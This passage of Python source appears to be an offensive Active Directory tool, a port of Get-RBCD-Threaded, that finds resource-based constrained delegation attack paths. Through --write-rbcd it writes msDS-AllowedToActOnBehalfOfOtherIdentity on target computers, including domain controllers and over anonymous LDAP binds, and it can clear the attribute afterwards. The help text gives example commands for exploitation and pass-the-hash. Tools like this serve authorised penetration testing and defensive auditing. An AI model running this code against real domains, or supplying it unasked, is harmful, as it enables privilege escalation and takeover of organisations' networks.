    port = 636 if use_ssl else 389

    server = Server(dc_host, port=port, use_ssl=use_ssl, get_info=ALL, connect_timeout=10)

    if args.anonymous or (not args.username and not args.password):
        cprint(f"[*] Using anonymous bind for RBCD cleanup", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS)
    elif args.username and args.password:
        if "\\" in args.username:
            ntlm_user = args.username
        else:
            ntlm_user = f"{args.domain}\\{args.username}"
        cprint(f"[*] Using NTLM auth as {ntlm_user} for RBCD cleanup", Colors.YELLOW)
        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM)
    else:
        cprint("[!] No valid auth method for cleanup", Colors.RED)
        return False

    if not conn.bind():
        cprint(f"[!] Bind failed: {conn.result}", Colors.RED)
        return False

    cprint(f"[+] Bind successful", Colors.GREEN)

    # Resolve target DN
    target_dn = resolve_target_dn(conn, base_dn, args.target)
    if not target_dn:
        cprint("[!] Cannot proceed without a valid target DN", Colors.RED)
        conn.unbind()
        return False
    cprint(f"[+] Target DN: {target_dn}", Colors.GREEN)

    # Clear the attribute
    cprint(f"[*] Clearing msDS-AllowedToActOnBehalfOfOtherIdentity...", Colors.YELLOW)
    result = conn.modify(
        target_dn,
        {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [])]}
    )

    if result:
        cprint(f"[+] SUCCESS! RBCD delegation removed from {args.target}", Colors.GREEN)
        cprint(f"[+] msDS-AllowedToActOnBehalfOfOtherIdentity has been cleared", Colors.GREEN)
    else:
        cprint(f"[!] FAILED to clear RBCD: {conn.result}", Colors.RED)

    conn.unbind()
    return result


# =============================================================================
# Output Functions
# =============================================================================

def print_results(rbcd_results: list):
    """Print results to console with color coding."""
    cprint(f"\n{'='*70}", Colors.GREEN)
    cprint(f"[+] Found {len(rbcd_results)} possible RBCD attack paths", Colors.GREEN)
    cprint(f"{'='*70}\n", Colors.GREEN)

    # Separate DC targets from regular computers
    dc_results = [r for r in rbcd_results if r.is_dc]
    regular_results = [r for r in rbcd_results if not r.is_dc]

    if dc_results:
        cprint(f"[!!!] {len(dc_results)} paths target DOMAIN CONTROLLERS:", Colors.RED)
        cprint(f"{'-'*70}", Colors.RED)
        for r in dc_results:
            cprint(f"  Source:      {r.source} ({r.source_sid})", Colors.RED)
            cprint(f"  Domain:      {r.source_domain}", Colors.RED)
            cprint(f"  Destination: {r.destination} [DC]", Colors.RED)
            cprint(f"  DN:          {r.destination_dn}", Colors.RED)
            cprint(f"  Privilege:   {r.privilege}", Colors.RED)
            cprint(f"  {'-'*60}", Colors.RED)
        print()

    if regular_results:
        cprint(f"[+] {len(regular_results)} paths on regular computer objects:", Colors.CYAN)
        cprint(f"{'-'*70}", Colors.CYAN)
        for r in regular_results:
            cprint(f"  Source:      {r.source}", Colors.CYAN)
            cprint(f"  Domain:      {r.source_domain}", Colors.CYAN)
            cprint(f"  Destination: {r.destination}", Colors.CYAN)
            cprint(f"  Privilege:   {r.privilege}", Colors.CYAN)
            cprint(f"  {'-'*60}", Colors.CYAN)


def export_csv(rbcd_results: list, filepath: str):
    """Export results to CSV."""
    try:
        with open(filepath, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=[
                "source", "source_sid", "source_domain", "destination",
                "destination_dn", "privilege", "is_dc"
            ])
            writer.writeheader()
            for r in rbcd_results:
                writer.writerow(asdict(r))
        cprint(f"[+] Results saved to {filepath}", Colors.GREEN)
        return True
    except Exception as e:
        cprint(f"[!] Failed to save CSV: {e}", Colors.RED)
        return False


def export_json(rbcd_results: list, filepath: str):
    """Export results to JSON."""
    try:
        with open(filepath, 'w') as f:
            json.dump([asdict(r) for r in rbcd_results], f, indent=2)
        cprint(f"[+] Results saved to {filepath}", Colors.GREEN)
        return True
    except Exception as e:
        cprint(f"[!] Failed to save JSON: {e}", Colors.RED)
        return False


# =============================================================================
# Main
# =============================================================================

def banner():
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██████╗  ██████╗██████╗     ██████╗ ██╗   ██╗      ║
║   ██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝      ║
║   ██████╔╝██████╔╝██║     ██║  ██║    ██████╔╝ ╚████╔╝       ║
║   ██╔══██╗██╔══██╗██║     ██║  ██║    ██╔═══╝   ╚██╔╝        ║
║   ██║  ██║██████╔╝╚██████╗██████╔╝    ██║        ██║         ║
║   ╚═╝  ╚═╝╚═════╝  ╚═════╝╚═════╝     ╚═╝        ╚═╝         ║
║                                                              ║
║  Resource-Based Constrained Delegation Enumerator            ║
║  Python port of Get-RBCD-Threaded by FatRodzianko            ║
║  Enumerate | Exploit | Cleanup                               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def main():
    banner()

    parser = argparse.ArgumentParser(
        description="Discover and exploit RBCD attack paths in Active Directory",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Authenticated scan
  %(prog)s -d corp.local -u admin -p 'Password123' --dc-ip 10.10.10.1

  # Anonymous/null session scan
  %(prog)s -d corp.local --dc-ip 10.10.10.1 --anonymous

  # With NTLM hash (pass-the-hash via DOMAIN\\user)
  %(prog)s -d corp.local -u 'CORP\\admin' -p 'LM:NT' --dc-ip 10.10.10.1

  # Filter stale computers + CSV output
  %(prog)s -d corp.local -u admin -p pass --dc-ip 10.10.10.1 --pwdlastset 90 -o results.csv

  # Check anonymous access only (no auth scan)
  %(prog)s -d corp.local --dc-ip 10.10.10.1 --anon-only

  # JSON output
  %(prog)s -d corp.local -u admin -p pass --dc-ip 10.10.10.1 --json results.json

  # Write RBCD delegation (authenticated)
  %(prog)s -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i \\
      --write-rbcd --target DC01 --delegate-from CODY_ROY

  # Write RBCD delegation (anonymous - like Operation Endgame)
  %(prog)s -d corp.local --dc-ip 10.10.10.1 -i \\
      --write-rbcd --target 'CN=DC01,OU=Domain Controllers,DC=corp,DC=local' \\
      --delegate-from CODY_ROY

  # Cleanup - remove RBCD delegation after exploitation
  %(prog)s -d corp.local --dc-ip 10.10.10.1 -i \\
      --clear-rbcd --target DC01
        """
    )

    parser.add_argument("-d", "--domain", required=True, help="Target domain FQDN (e.g. corp.local)")
    parser.add_argument("-u", "--username", help="Username to authenticate as")
    parser.add_argument("-p", "--password", help="Password or LM:NT hash")
    parser.add_argument("--dc-ip", help="IP address of the Domain Controller")
    parser.add_argument("-o", "--output", help="Output results to CSV file")
    parser.add_argument("--json", dest="json_output", help="Output results to JSON file")
    parser.add_argument("-i", "--insecure", action="store_true",
                        help="Use plaintext LDAP (port 389) instead of LDAPS (port 636)")
    parser.add_argument("--pwdlastset", type=int, default=0,
                        help="Filter out computers with pwdLastSet older than N days")
    parser.add_argument("--anonymous", action="store_true",
                        help="Use anonymous LDAP bind")
    parser.add_argument("--anon-only", action="store_true",
                        help="Only check anonymous/guest write access (skip authenticated scan)")
    parser.add_argument("-k", "--kerberos", action="store_true",
                        help="Use Kerberos authentication")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of threads for ACL processing (default: 10)")
    parser.add_argument("--no-anon-check", action="store_true",
                        help="Skip the bonus anonymous access check")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable colored output")

    # RBCD Write/Clear operations
    rbcd_group = parser.add_argument_group("RBCD Write/Clear (use with caution)")
    rbcd_group.add_argument("--write-rbcd", action="store_true",
                        help="Write msDS-AllowedToActOnBehalfOfOtherIdentity on target (EXPLOITATION)")
    rbcd_group.add_argument("--clear-rbcd", action="store_true",
                        help="Clear msDS-AllowedToActOnBehalfOfOtherIdentity on target (CLEANUP)")
    rbcd_group.add_argument("--target",
                        help="Target computer: DN, sAMAccountName, or dNSHostName")
    rbcd_group.add_argument("--delegate-from",
                        help="Principal to delegate from: sAMAccountName or SID (required for --write-rbcd)")

    args = parser.parse_args()

    # Disable colors if requested
    if args.no_color:
        for attr in dir(Colors):
            if not attr.startswith('_'):
                setattr(Colors, attr, "")

    start_time = time.time()

    # Build base DN
    base_dn = ",".join([f"DC={part}" for part in args.domain.split(".")])

    # Handle RBCD write/clear modes
    if args.write_rbcd:
        if not args.target:
            cprint("[!] --write-rbcd requires --target", Colors.RED)
            sys.exit(1)
        if not args.delegate_from:
            cprint("[!] --write-rbcd requires --delegate-from", Colors.RED)
            sys.exit(1)

        cprint(f"\n{Colors.RED}{'!'*70}", Colors.RED)
        cprint(f"  WARNING: You are about to MODIFY an Active Directory object.", Colors.RED)
        cprint(f"  Target:        {args.target}", Colors.RED)
        cprint(f"  Delegate-from: {args.delegate_from}", Colors.RED)
        cprint(f"{'!'*70}{Colors.RESET}\n", Colors.RED)

        confirm = input(f"{Colors.RED}Type 'YOUREALLYREALLYSURE' to confirm: {Colors.RESET}")
        if confirm.strip() != "YOUREALLYREALLYSURE":
            cprint("[*] Aborted.", Colors.YELLOW)
            sys.exit(0)

        success = write_rbcd(args, base_dn)
        elapsed = time.time() - start_time
        cprint(f"\n[*] Execution time: {elapsed:.2f} seconds", Colors.BLUE)
        sys.exit(0 if success else 1)

    if args.clear_rbcd:
        if not args.target:
            cprint("[!] --clear-rbcd requires --target", Colors.RED)
            sys.exit(1)

        cprint(f"\n{Colors.MAGENTA}{'!'*70}", Colors.MAGENTA)
        cprint(f"  Clearing RBCD delegation on: {args.target}", Colors.MAGENTA)
        cprint(f"{'!'*70}{Colors.RESET}\n", Colors.MAGENTA)

        confirm = input(f"{Colors.MAGENTA}Type 'YES' to confirm cleanup: {Colors.RESET}")
        if confirm.strip() != "YES":
            cprint("[*] Aborted.", Colors.YELLOW)
            sys.exit(0)

        success = clear_rbcd(args, base_dn)
        elapsed = time.time() - start_time
        cprint(f"\n[*] Execution time: {elapsed:.2f} seconds", Colors.BLUE)
        sys.exit(0 if success else 1)

    # If anon-only mode, skip authenticated scan
    if args.anon_only:
        anon_results = check_anonymous_rbcd(args, base_dn)
        all_results = anon_results
    else:
        # Establish connection
        try:
            conn, base_dn = create_connection(args)
        except Exception as e:
            cprint(f"[!] Failed to connect: {e}", Colors.RED)
            sys.exit(1)

        # Phase 1: Enumerate all SIDs
        cprint(f"\n{'='*70}", Colors.BLUE)
        cprint("[*] Phase 1: Enumerating domain objects...", Colors.BLUE)
        cprint(f"{'='*70}", Colors.BLUE)

        all_sids = []
        all_sid_maps = []

        user_sids, user_maps = get_users(conn, base_dn, args.domain)
        all_sids.extend(user_sids)
        all_sid_maps.extend(user_maps)

        group_sids, group_maps = get_groups(conn, base_dn, args.domain)
        all_sids.extend(group_sids)
        all_sid_maps.extend(group_maps)

        computer_sids, computer_maps, computer_entries = get_computers(
            conn, base_dn, args.domain, args.pwdlastset
        )
        all_sids.extend(computer_sids)
        all_sid_maps.extend(computer_maps)

        # Build fast lookup structures
        all_sids_set = set(all_sids)
        sid_map_dict = {m.object_sid: m for m in all_sid_maps}

        total_objects = len(all_sids)
        cprint(f"\n[+] Total enumerated SIDs: {total_objects}", Colors.GREEN)

        # Phase 2: Analyze ACLs
        cprint(f"\n{'='*70}", Colors.BLUE)
        cprint(f"[*] Phase 2: Analyzing DACLs on {len(computer_entries)} computer objects...", Colors.BLUE)
        cprint(f"{'='*70}", Colors.BLUE)

        rbcd_results = []

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(check_rbcd_aces, entry, all_sids_set, sid_map_dict): entry
                for entry in computer_entries
            }
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 100 == 0 or completed == len(computer_entries):
                    print(f"\r[*] Processed {completed}/{len(computer_entries)} computer objects...", end="", flush=True)
                try:
                    results = future.result()
                    rbcd_results.extend(results)
                except Exception as e:
                    cprint(f"\n[!] Error processing entry: {e}", Colors.RED)

        print()  # newline after progress

        # Cleanup
        try:
            conn.unbind()
        except:
            pass

        # Phase 3: Anonymous check
        all_results = rbcd_results
        if not args.no_anon_check:
            anon_results = check_anonymous_rbcd(args, base_dn)
            all_results = rbcd_results + anon_results

    # Output results
    if all_results:
        print_results(all_results)

        if args.output:
            if not export_csv(all_results, args.output):
                cprint("[!] Falling back to console output", Colors.YELLOW)
                print_results(all_results)

        if args.json_output:
            export_json(all_results, args.json_output)
    else:
        cprint("\n[-] No RBCD attack paths found.", Colors.YELLOW)

    elapsed = time.time() - start_time
    cprint(f"\n[*] Execution time: {elapsed:.2f} seconds", Colors.BLUE)


if __name__ == "__main__":
    main()
